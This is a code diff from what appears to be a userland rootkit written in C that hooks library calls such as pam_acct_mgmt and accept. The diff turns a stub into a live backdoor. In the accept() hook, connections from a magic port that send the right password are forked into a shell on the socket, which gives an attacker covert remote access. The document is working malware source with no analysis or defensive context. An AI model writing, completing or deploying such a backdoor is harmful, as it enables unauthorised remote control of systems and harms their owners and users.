@@ -11,6 +11,7 @@
 */
 
 #define  _GNU_SOURCE
+#include <stdio.h>
 #include <string.h>
 #include <sys/types.h>
 #include <pwd.h>
@@ -55,19 +56,24 @@ int pam_acct_mgmt(pam_handle_t *pamh, int flags)
     return (int) libcalls[PAM_ACCT_MGMT](pamh, flags);
 }
 
-/* accept() backdoor. */
+/* accept() backdoor -- to-do: spawn PTY instead of just interactive shell. */
 int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen)
 {
+	const size_t pass_len = strlen(SHELL_PASS);
+	char password[pass_len];
     unsigned short int port;
-    int retval;
+    int retfd;
 
-    retval = (int) libcalls[ACCEPT](sockfd, addr, addrlen);
-    port   = ntohs(((struct sockaddr_in *) addr)->sin_port);
+    retfd = (int) libcalls[ACCEPT](sockfd, addr, addrlen);
+    port  = ntohs(((struct sockaddr_in *) addr)->sin_port);
 
-/*
     if(port == MAGIC_PORT)
-        ** Open a PTY? **
-*/
+	{
+		read(retfd, password, pass_len);
 
-    return retval;
+		if(strncmp(password, SHELL_PASS, pass_len) == 0 && fork() == 0)
+			drop_shell(retfd);
+	}
+
+    return retfd;
 }
